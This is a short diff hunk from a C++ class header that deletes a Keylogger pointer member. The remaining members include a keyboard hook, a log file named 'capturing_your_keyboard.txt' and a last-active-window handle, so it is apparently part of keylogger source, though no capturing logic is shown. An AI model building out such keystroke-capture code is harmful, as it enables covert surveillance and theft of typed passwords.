@@ -16,7 +16,6 @@ public:
 private:
 	const int BUFFER_SIZE = 10;
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
-	Keylogger* keylogger;
 	Hook* hook;
 	ofstream logFile;
 	HWND lastActiveWindow;
